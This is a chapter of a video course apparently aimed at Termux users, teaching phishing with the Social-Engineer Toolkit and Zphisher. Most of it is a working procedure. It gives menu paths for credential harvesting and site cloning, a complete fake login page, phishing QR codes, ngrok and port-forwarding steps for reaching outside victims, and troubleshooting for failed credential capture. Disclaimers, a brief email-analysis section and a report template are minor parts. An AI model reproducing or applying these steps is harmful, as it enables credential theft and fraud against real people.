### Credential Harvester Commands

```bash
# Start credential harvester
setoolkit
> 1  # Social-Engineering Attacks
> 2  # Website Attack Vectors
> 3  # Credential Harvester Attack Method

# Then select:
1  # Web Templates (pre-built pages)
2  # Site Cloner (clone any website)
3  # Custom Import (your own HTML)

# For Web Templates, available options:
1  # Java Required
2  # Google
3  # Facebook
4  # Twitter
5  # Yahoo
# ... and more
```

### System Commands for SET

```bash
# Check your IP address
ifconfig
ip addr show
hostname -I

# Check if web server is running
netstat -tulpn | grep :80
netstat -tulpn | grep :443

# Kill web server
pkill apache2
pkill python3

# View captured credentials
cat /root/.set/reports/*.txt
cat ~/.set/reports/*.txt

# Check SET logs
cat /var/log/set.log

# Edit SET configuration
nano /etc/setoolkit/set_config.py
```

### NGrok Commands

```bash
# Start ngrok tunnel
ngrok http 80

# Start with specific port
ngrok http 8080

# Start HTTPS tunnel
ngrok http https://localhost:443

# View tunnel status
# Visit: http://127.0.0.1:4040

# Add authentication
ngrok config add-authtoken YOUR_TOKEN
```

### Proot-Distro Commands

```bash
# List available distributions
proot-distro list

# Install a distribution
proot-distro install ubuntu
proot-distro install kali

# Login to distribution
proot-distro login ubuntu
proot-distro login kali

# Login with shared Termux storage
proot-distro login ubuntu --shared-tmp

# Remove distribution
proot-distro remove ubuntu

# Backup distribution
proot-distro backup ubuntu

# Restore distribution
proot-distro restore ubuntu-backup.tar.gz
```

### Zphisher Commands

```bash
# Start Zphisher
bash zphisher.sh

# Available options:
1  # Social Media attacks
2  # Email providers
3  # Banking
4  # Gaming
5  # Custom page

# Select tunnel method:
1  # localhost.run (no signup)
2  # ngrok (requires auth)
3  # cloudflared
```

### Defensive Commands

```bash
# Check email headers (on mail server)
dig TXT domain.com
dig TXT _dmarc.domain.com

# Check SPF record
dig TXT domain.com | grep spf

# Check DMARC
dig TXT _dmarc.domain.com

# Analyze suspicious URL
curl -I http://suspicious-url.com
whois suspicious-url.com

# Check SSL certificate
echo | openssl s_client -connect domain.com:443 2>/dev/null | openssl x509 -noout -issuer -dates
```

### Reporting Commands

```bash
# Create report directory
mkdir -p ~/security-reports/$(date +%Y-%m-%d)

# Save captured data (for documentation)
cp ~/.set/reports/*.txt ~/security-reports/$(date +%Y-%m-%d)/

# Generate hash of captured data
md5sum ~/.set/reports/*.txt

# Create timestamped log
echo "Test conducted: $(date)" >> ~/security-reports/test-log.txt

# Screenshot for documentation (if using GUI)
import -window root screenshot-$(date +%Y%m%d-%H%M%S).png
```

---

## 💻 PRACTICE EXERCISES

### Exercise 1: SET Installation

```bash
# Task: Install SET in Ubuntu proot environment

# Step 1: Install proot-distro
pkg install proot-distro -y

# Step 2: Install Ubuntu
proot-distro install ubuntu

# Step 3: Login and verify
proot-distro login ubuntu
cat /etc/os-release

# Step 4: Install dependencies
apt update
apt install -y git python3 python3-pip build-essential \
    libssl-dev libffi-dev

# Step 5: Clone and install SET
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip3 install -r requirements.txt
python3 setup.py install

# Step 6: Verify installation
setoolkit --version
# or just run
setoolkit

# Expected: SET menu should appear
```

### Exercise 2: Credential Harvester (Local Test)

```bash
# Task: Test credential harvester on local machine

# Step 1: Start SET
setoolkit

# Step 2: Navigate menus
# Select: 1 → 2 → 3

# Step 3: Choose Web Templates
# Select: 1

# Step 4: Select a template (e.g., Google)
# Select: 2

# Step 5: Enter your IP
# Use your local IP or 127.0.0.1 for testing

# Step 6: Open browser on same device
# Navigate to: http://127.0.0.1

# Step 7: Enter test credentials
# Username: test@test.com
# Password: testpassword123

# Step 8: Check terminal
# Credentials should appear in SET output

# Step 9: View saved credentials
cat ~/.set/reports/*.txt
```

### Exercise 3: Website Cloning

```bash
# Task: Clone a simple website

# Step 1: Start SET
setoolkit

# Step 2: Navigate to credential harvester
# Select: 1 → 2 → 3

# Step 3: Choose Site Cloner
# Select: 2

# Step 4: Enter URL to clone
# Example: http://example.com

# Step 5: Set IP address
# Use your local IP

# Step 6: Test the cloned site
# Open browser: http://YOUR_IP

# Step 7: Verify clone matches original
# Compare visual elements

# Expected: Cloned site should look similar to original
```

### Exercise 4: Create Custom Phishing Page

```bash
# Task: Create a custom phishing page

# Step 1: Create HTML file
cat > /tmp/custom_page.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Company Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            padding-top: 100px;
            background: #f0f0f0;
        }
        .login-box {
            background: white;
            padding: 30px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 300px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Employee Login</h2>
        <form action="/post" method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <p style="font-size:12px; color:#666;">Forgot password?</p>
    </div>
</body>
</html>
EOF

# Step 2: Use custom import in SET
# setoolkit → 1 → 2 → 3 → 3 (Custom Import)
# Enter path: /tmp/custom_page.html

# Expected: Your custom page is served
```

### Exercise 5: QR Code Generation

```bash
# Task: Generate phishing QR code

# Step 1: Start SET
setoolkit

# Step 2: Navigate to QR code
# Select: 1 → 8

# Step 3: Enter your phishing URL
# Example: http://192.168.1.100 (your IP)

# Step 4: SET generates QR code image
# Saved in ~/.set/qr_code.png

# Step 5: View the QR code
# Transfer to device with GUI or view in gallery

# Expected: QR code image created
```

### Exercise 6: Defense Analysis

```bash
# Task: Analyze a phishing email (simulated)

# Create a sample phishing email for analysis:
cat > /tmp/suspicious_email.txt << 'EOF'
From: security@bankofamerica.com
Reply-To: support@banksecure-verify.com
Subject: URGENT: Your Account Has Been Limited

Dear Valued Customer,

We have detected unusual activity on your account. 
Click here to verify: http://bankofamerica-secure-verify.com/login

If you do not verify within 24 hours, your account will be suspended.

Best regards,
Bank of America Security Team
EOF

# Analyze:
# 1. Check sender domain vs reply-to
# 2. Analyze URL (hover check)
# 3. Look for urgency tactics
# 4. Check for personalization (none here)
# 5. Grammar/spelling check

# Document findings:
echo "Phishing Indicators:" > /tmp/analysis.txt
echo "1. Reply-To different from From address" >> /tmp/analysis.txt
echo "2. URL different from displayed domain" >> /tmp/analysis.txt
echo "3. Urgency language used" >> /tmp/analysis.txt
echo "4. Generic greeting" >> /tmp/analysis.txt
echo "5. Threatening language" >> /tmp/analysis.txt

cat /tmp/analysis.txt
```

### Exercise 7: Network Configuration

```bash
# Task: Configure network for phishing test

# Step 1: Check network interfaces
ip addr show
ifconfig

# Step 2: Find your IP
ip addr show wlan0 | grep inet

# Step 3: Check if port 80 is available
netstat -tulpn | grep :80

# Step 4: If port occupied, kill process
sudo fuser -k 80/tcp

# Step 5: Configure firewall (if needed)
# Allow incoming connections on port 80

# Step 6: Verify connectivity
ping -c 3 google.com

# Step 7: Test web server
python3 -m http.server 80 &
curl http://localhost
pkill python3

# Expected: Port 80 should be available for SET
```

### Exercise 8: Report Documentation

```bash
# Task: Create professional security test report

# Create report template
mkdir -p ~/security-reports/SET-Test-$(date +%Y%m%d)
cd ~/security-reports/SET-Test-$(date +%Y%m%d)

# Create report header
cat > report.md << 'EOF'
# Social Engineering Assessment Report

## Executive Summary
- **Date:** $(date +%Y-%m-%d)
- **Client:** [Company Name]
- **Assessor:** [Your Name]
- **Scope:** Phishing awareness testing

## Methodology
- Tool: Social Engineering Toolkit (SET)
- Attack Vector: Credential Harvesting
- Target Group: [Department]

## Findings

### Test Configuration
- Attack Type: [Phishing/Vishing/etc.]
- Template Used: [Google/Facebook/Custom]
- Duration: [Hours]
- Targets: [Number]

### Results
| Metric | Value |
|--------|-------|
| Emails Sent | X |
| Links Clicked | X |
| Credentials Captured | X |
| Success Rate | X% |

### Recommendations
1. Implement security awareness training
2. Enable 2FA for all accounts
3. Deploy email filtering (SPF/DKIM/DMARC)
4. Conduct regular phishing simulations

## Appendix A: Timeline
## Appendix B: Raw Data
## Appendix C: Remediation Steps
EOF

# Save test data
echo "Test completed at: $(date)" >> timeline.txt

# Expected: Professional report structure created
```

---

## ⚠️ TROUBLESHOOTING

### Problem 1: SET Installation Fails

```bash
# Symptom: pip install errors

# Cause: Missing dependencies or Python version issues

# Solution 1: Install all dependencies
apt install -y python3 python3-pip python3-dev \
    build-essential libssl-dev libffi-dev \
    libxml2-dev libxslt1-dev zlib1g-dev

# Solution 2: Upgrade pip
pip3 install --upgrade pip

# Solution 3: Install setuptools
pip3 install setuptools wheel

# Solution 4: Try with --break-system-packages (newer Python)
pip3 install -r requirements.txt --break-system-packages
```

### Problem 2: "Permission denied" for Web Server

```bash
# Symptom: Cannot bind to port 80

# Cause: Port 80 requires root privileges

# Solution 1: Use higher port (8080)
# In SET config, change port to 8080

# Solution 2: Use sudo (in real Linux, not proot)
sudo setoolkit

# Solution 3: Run as root user
# In proot, you are effectively root

# Solution 4: Kill existing web server
pkill apache2
pkill nginx
```

### Problem 3: Website Not Accessible

```bash
# Symptom: Phishing page not loading

# Cause: Firewall, wrong IP, or server not running

# Solution 1: Check server is running
netstat -tulpn | grep :80

# Solution 2: Check correct IP
ip addr show
# Use the IP shown for wlan0 or eth0

# Solution 3: Test locally first
curl http://127.0.0.1

# Solution 4: Check firewall (if applicable)
iptables -L
# Allow port 80 if blocked

# Solution 5: Verify Apache is running
service apache2 status
service apache2 start
```

### Problem 4: NGrok Not Working

```bash
# Symptom: NGrok tunnel fails

# Cause: Missing auth token or network issues

# Solution 1: Add auth token
ngrok config add-authtoken YOUR_TOKEN

# Solution 2: Check internet connection
ping -c 3 google.com

# Solution 3: Try alternative tunnel
# Use cloudflared or localhost.run

# Solution 4: Check ngrok status
# Visit: http://127.0.0.1:4040

# Solution 5: Use ngrok v2 syntax
ngrok http 80  # instead of ngrok http 8080
```

### Problem 5: Credentials Not Captured

```bash
# Symptom: Page loads but no credentials captured

# Cause: Form action not modified correctly

# Solution 1: Check if SET is still running
ps aux | grep setoolkit

# Solution 2: Verify harvester is active
# Look for "Harvester is active" message

# Solution 3: Check logs
cat ~/.set/reports/*.log

# Solution 4: Test with simple input
# Enter test credentials manually

# Solution 5: Check HTML source
curl http://YOUR_IP | grep -i form
# Verify form action points to correct endpoint
```

### Problem 6: SSL/HTTPS Errors

```bash
# Symptom: HTTPS sites not cloning properly

# Cause: SSL certificate verification

# Solution 1: Use HTTP sites for cloning
# HTTP sites clone more reliably

# Solution 2: Disable SSL verification
export PYTHONHTTPSVERIFY=0

# Solution 3: Use certificate in SET
# Enable SSL in SET configuration

# Solution 4: Create self-signed certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Solution 5: Use Apache with SSL
a2enmod ssl
service apache2 restart
```

### Problem 7: Proot-Distro Issues

```bash
# Symptom: Cannot login to Ubuntu

# Cause: Installation incomplete or corrupted

# Solution 1: Reinstall Ubuntu
proot-distro remove ubuntu
proot-distro install ubuntu

# Solution 2: Check available space
df -h

# Solution 3: Clear cache
proot-distro clear-cache

# Solution 4: Update proot-distro
pkg update
pkg upgrade proot-distro

# Solution 5: Check error logs
proot-distro install ubuntu --verbose
```

### Problem 8: Python Version Conflict

```bash
# Symptom: Python errors when running SET

# Cause: Wrong Python version or modules

# Solution 1: Check Python version
python3 --version
# Should be 3.6 or higher

# Solution 2: Install specific Python
apt install python3.9 python3.9-pip

# Solution 3: Use virtual environment
python3 -m venv setenv
source setenv/bin/activate
pip install -r requirements.txt

# Solution 4: Install pexpect manually
pip3 install pexpect
```

### Problem 9: Metasploit Integration Fails

```bash
# Symptom: Metasploit payloads not working

# Cause: Metasploit not installed or configured

# Solution 1: Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall

# Solution 2: Start PostgreSQL
service postgresql start

# Solution 3: Initialize database
msfdb init

# Solution 4: Configure SET for Metasploit
# Edit: /etc/setoolkit/set_config.py
# Set: METASPLOIT_PATH = /usr/share/metasploit-framework
```

### Problem 10: Network Connectivity Issues

```bash
# Symptom: Victims cannot access phishing page

# Cause: Network configuration issues

# Solution 1: Check IP is correct
# Must use IP accessible by victims

# Solution 2: Same WiFi network
# Attacker and victim must be on same network for local testing

# Solution 3: Port forwarding (for external access)
# Configure router to forward port 80 to your machine

# Solution 4: Use ngrok for external access
ngrok http 80

# Solution 5: Disable VPN
# VPN may interfere with local network access
```

---

## 🎬 VIDEO ASSETS

### Thumbnail Concepts

**Option A: Professional Style**
```
┌────────────────────────────────────┐
│  [Dark Terminal Background]        │
│                                    │
│   ⚠️ SOCIAL ENGINEERING            │
│   TOOLKIT (SET)                    │
│                                    │
│   🎣 Phishing Attacks              │
│   🔐 Credential Harvesting         │
│   📱 Fake Login Pages              │
│                                    │
│   [T3rmuxk1ng Logo]                │
└────────────────────────────────────┘
```

**Option B: Warning Style**
```
┌────────────────────────────────────┐
│  🔴 WARNING: DANGEROUS TOOL        │
│                                    │
│  SOCIAL ENGINEERING                │
│  TOOLKIT TUTORIAL                  │
│                                    │
│  ⚡ Steal Credentials              │
│  ⚡ Clone Websites                 │
│  ⚡ Create Payloads                │
│                                    │
│  Chapter 37 | T3rmuxk1ng           │
└────────────────────────────────────┘
```

**Option C: Comparison Style**
```
┌────────────────────────────────────┐
│  🔒 Security Test vs 🎣 Phishing   │
│  ─────────────────────────────────│
│                                    │
│  ETHICAL USE:    ✅ Testing        │
│                  ✅ Training       │
│                  ✅ Awareness      │
│                                    │
│  ILLEGAL USE:    ❌ Theft          │
│                  ❌ Fraud          │
│                  ❌ Damage         │
│                                    │
│  SET in Termux | T3rmuxk1ng        │
└────────────────────────────────────┘
```

### Video Description Template

```markdown
🎣 Termux Full Course - Chapter 37: Social Engineering Toolkit (SET) | Complete Guide

🔥 In this video you'll learn:
• Social Engineering fundamentals
• SET installation in Termux (proot-distro)
• Credential harvesting attacks
• Website cloning techniques
• Creating fake login pages
• Defense against SE attacks
• Legal considerations

⏱️ Timestamps:
0:00 - Introduction
0:50 - Social Engineering Fundamentals
4:00 - SET Introduction
6:00 - SET Installation
10:00 - SET Menu Structure
12:00 - Credential Harvesting Demo
16:00 - Phishing Mechanics
18:00 - Payload Creation
20:00 - Defense Strategies
22:00 - Legal Considerations
23:30 - Alternative Tools
25:00 - Summary

📥 Installation Commands:
pkg install proot-distro -y
proot-distro install ubuntu
proot-distro login ubuntu
apt update && apt upgrade -y
apt install git python3 python3-pip -y
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip3 install -r requirements.txt
python3 setup.py install
setoolkit

⚠️ DISCLAIMER: This video is for EDUCATIONAL PURPOSES ONLY. Use these techniques ONLY for authorized security testing. Unauthorized phishing attacks are ILLEGAL.

📚 Full Course Playlist:
[PLAYLIST LINK]

📱 Follow T3rmuxk1ng:
• YouTube: @T3rmuxk1ng
• Telegram: [LINK]
• GitHub: [LINK]

#Termux #SET #SocialEngineering #Phishing #EthicalHacking #T3rmuxk1ng #TermuxCourse #CyberSecurity #PenetrationTesting #InfoSec

---
⚠️ Disclaimer: This video is for educational purposes only. Only use these techniques on systems you have explicit permission to test. Unauthorized access to computer systems is illegal.
```

### Tags List

```
social engineering toolkit, set, setoolkit, phishing, credential harvesting, 
termux, termux course, ethical hacking, penetration testing, cybersecurity, 
social engineering attacks, fake login page, website cloning, hacking tools, 
t3rmuxk1ng, termux tutorial, security testing, bug bounty, information security, 
phishing attack, man in the middle, wifi phishing, evil twin, pretexting, 
vishing, smishing, spear phishing, security awareness, cyber security course, 
hindi tutorial, termux hacking, mobile hacking, android hacking tools
```

### Hashtags

```
#SocialEngineering #SET #Phishing #EthicalHacking #CyberSecurity #Termux 
#PenetrationTesting #InfoSec #T3rmuxk1ng #TermuxCourse #HackingTools 
#SecurityTesting #BugBounty #CyberSecurityTraining #PhishingAwareness 
#SocialEngineeringToolkit #CredentialHarvesting #WebsiteCloning
```

---

## 📚 ADDITIONAL RESOURCES

### Official Resources

| Resource | Link |
|----------|------|
| SET GitHub | https://github.com/trustedsec/social-engineer-toolkit |
| TrustedSec | https://www.trustedsec.com/ |
| SET Documentation | https://github.com/trustedsec/social-engineer-toolkit/tree/master/readme |

### Alternative Tools

| Tool | Repository | Description |
|------|------------|-------------|
| Zphisher | github.com/htr-tech/zphisher | Beginner-friendly phishing toolkit |
| SocialFish | github.com/UndeadSec/SocialFish | Simple phishing framework |
| Shellphish | github.com/thelinuxchoice/shellphish | Multi-platform phishing tool |
| Evilginx2 | github.com/kgretzky/evilginx2 | Advanced MITM phishing proxy |
| Gophish | github.com/gophish/gophish | Phishing framework for testing |
| BlackEye | github.com/An0nUD4Y/blackeye | Credential harvester |

### Learning Resources

| Resource | Description |
|----------|-------------|
| Social-Engineer.org | SE community and resources |
| Phishing Quiz | Google's phishing quiz |
| KnowBe4 | Security awareness training |
| SANS Institute | Cybersecurity training |
| OWASP | Web security resources |

### Legal Resources

| Resource | Description |
|----------|-------------|
| Computer Fraud Act | US federal law |
| IT Act 2000 | Indian cyber law |
| GDPR | European data protection |
| ISO 27001 | Security standard |

---

## ✅ CHAPTER CHECKLIST

Before moving to Chapter 38, verify:

- [ ] Installed proot-distro successfully
- [ ] Ubuntu environment working
- [ ] SET installed and running
- [ ] Understand main menu structure
- [ ] Tested credential harvester locally
- [ ] Understand phishing mechanics
- [ ] Know defense strategies
- [ ] Understand legal implications
- [ ] Can create basic reports

---

## 🎯 NEXT CHAPTER PREVIEW

**Chapter 38: WiFi Security Tools**

- WiFi security fundamentals
- Aircrack-ng installation
- Monitor mode setup
- WPA handshake capture
- Wifite automation tool
- WiFi adapter requirements
- Legal considerations for WiFi testing

---

**Chapter Complete! 🎉**

*Created by T3rmuxk1ng | Termux Full Course*

---

## 📊 QUICK REFERENCE CARD

```
┌─────────────────────────────────────────────────────────────────────────┐
│              SET QUICK REFERENCE                                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  INSTALLATION:                                                          │
│  pkg install proot-distro                                               │
│  proot-distro install ubuntu                                            │
│  proot-distro login ubuntu                                              │
│  git clone https://github.com/trustedsec/social-engineer-toolkit.git    │
│  cd social-engineer-toolkit && pip3 install -r requirements.txt         │
│  python3 setup.py install                                               │
│                                                                         │
│  RUN SET:                                                               │
│  setoolkit                                                              │
│                                                                         │
│  CREDENTIAL HARVESTER:                                                  │
│  1 → 2 → 3 → [Template/Clone/Custom]                                   │
│                                                                         │
│  EXTERNAL ACCESS:                                                       │
│  ngrok http 80                                                          │
│                                                                         │
│  VIEW CREDENTIALS:                                                      │
│  cat ~/.set/reports/*.txt                                               │
│                                                                         │
│  LEGAL:                                                                 │
│  ✅ Authorized testing only                                            │
│  ❌ Unauthorized attacks illegal                                        │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```
